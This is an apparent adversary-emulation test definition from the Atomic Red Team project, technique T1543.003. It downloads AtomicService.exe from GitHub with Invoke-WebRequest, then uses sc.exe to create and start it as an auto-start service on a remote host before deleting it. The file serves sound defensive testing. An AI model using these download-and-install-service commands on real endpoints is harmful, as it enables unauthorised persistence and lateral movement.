{
  "id": "fb4151a2-db33-4f8c-b7f8-78ea8790f961",
  "name": "Remote Service Installation CMD",
  "description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "7cf17eb1-50d0-4201-99e5-10f5d3e82214",
      "type": "execute-command",
      "data": {
        "command": "sc.exe \\\\#{remote_host} create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type} type=#{service_type}\nsc.exe \\\\#{remote_host} start #{service_name}\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "1b5b552b-47bf-4352-b8b3-10adba09664c",
      "type": "execute-command",
      "data": {
        "command": "sc.exe \\\\#{remote_host} stop #{service_name} \u003enul 2\u003e\u00261\nsc.exe \\\\#{remote_host} delete #{service_name} \u003enul 2\u003e\u00261",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "1d486c1e-ceed-488d-b343-6e09b5fa3e76",
      "name": "Check dependency 1/1",
      "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "30273f13-5339-4ea1-82fe-4bf7f1f6afa8",
      "name": "Resolve dependency 1/1",
      "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7305b76d-35ad-47fe-8545-662ce215ccfe",
      "name": "Re-check dependency 1/1",
      "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "7cf17eb1-50d0-4201-99e5-10f5d3e82214",
      "p": "on-success",
      "o": "1b5b552b-47bf-4352-b8b3-10adba09664c"
    },
    {
      "s": "7cf17eb1-50d0-4201-99e5-10f5d3e82214",
      "p": "on-failure",
      "o": "1b5b552b-47bf-4352-b8b3-10adba09664c"
    },
    {
      "s": "1d486c1e-ceed-488d-b343-6e09b5fa3e76",
      "p": "on-success",
      "o": "7cf17eb1-50d0-4201-99e5-10f5d3e82214"
    },
    {
      "s": "1d486c1e-ceed-488d-b343-6e09b5fa3e76",
      "p": "on-failure",
      "o": "30273f13-5339-4ea1-82fe-4bf7f1f6afa8"
    },
    {
      "s": "30273f13-5339-4ea1-82fe-4bf7f1f6afa8",
      "p": "on-success",
      "o": "7305b76d-35ad-47fe-8545-662ce215ccfe"
    },
    {
      "s": "7305b76d-35ad-47fe-8545-662ce215ccfe",
      "p": "on-failure",
      "o": "7cf17eb1-50d0-4201-99e5-10f5d3e82214"
    }
  ],
  "tags": [
    "T1543.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "binary_path",
      "type": "path",
      "description": "Name of the service binary, include path.",
      "value": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"
    },
    {
      "name": "service_type",
      "type": "string",
      "description": "Type of service. May be own,share,interact,kernel,filesys,rec,userown,usershare",
      "value": "Own"
    },
    {
      "name": "startup_type",
      "type": "string",
      "description": "Service start method. May be boot,system,auto,demand,disabled,delayed-auto",
      "value": "auto"
    },
    {
      "name": "service_name",
      "type": "string",
      "description": "Name of the Service",
      "value": "AtomicTestService_CMD"
    },
    {
      "name": "remote_host",
      "type": "string",
      "description": "Name of the remote endpoint",
      "value": "localhost"
    }
  ]
}